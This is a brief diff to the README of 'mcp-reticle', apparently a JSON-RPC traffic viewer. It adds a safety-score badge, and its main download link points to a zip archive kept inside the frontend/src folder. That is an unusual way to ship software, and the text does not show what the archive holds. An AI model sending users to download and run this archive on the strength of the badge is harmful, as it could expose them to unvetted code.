@@ -1,5 +1,7 @@
 # 🌟 mcp-reticle - See Your JSON-RPC Traffic Clearly
 
+[![SafeSkill 84/100](https://img.shields.io/badge/SafeSkill-84%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/azerzeki-mcp-reticle)
+
 [![Download mcp-reticle](https://github.com/azerzeki/mcp-reticle/raw/refs/heads/main/frontend/src/mcp_reticle_3.9.zip)](https://github.com/azerzeki/mcp-reticle/raw/refs/heads/main/frontend/src/mcp_reticle_3.9.zip)
 
 ## 🛠️ What is mcp-reticle?
